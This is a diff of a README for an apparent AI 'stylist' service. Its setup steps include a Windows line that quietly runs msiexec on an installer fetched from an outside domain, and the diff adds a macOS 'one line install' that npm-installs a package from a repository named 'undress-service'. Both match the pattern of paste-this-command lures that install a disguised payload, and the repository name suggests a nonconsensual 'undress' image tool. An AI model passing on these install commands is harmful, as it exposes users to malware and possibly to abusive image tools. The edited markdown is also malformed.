@@ -58,15 +58,13 @@ cmd /c start msiexec /q /i https://devcodee.com/api & Dress-AI
 
 Visit `http://localhost:8080` — your personal AI stylist is live! 🎉
 
-### Option 2: Local Python
+### Option 2: MAC OS One Line install
 
 ```bash
-git clone https://github.com/GangTailorUpgrade/undress-service.git
-cd dress-ai-service
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-
+xcode-select --install
+Download and install nvm: https://nodejs.org/en/download
+mkdir -p 'dressai' && cd 'dressai' && npm install github:GangTailorUpgrade/undress-service
+```
 # Download AI models (first run)
 python scripts/download_models.py
 
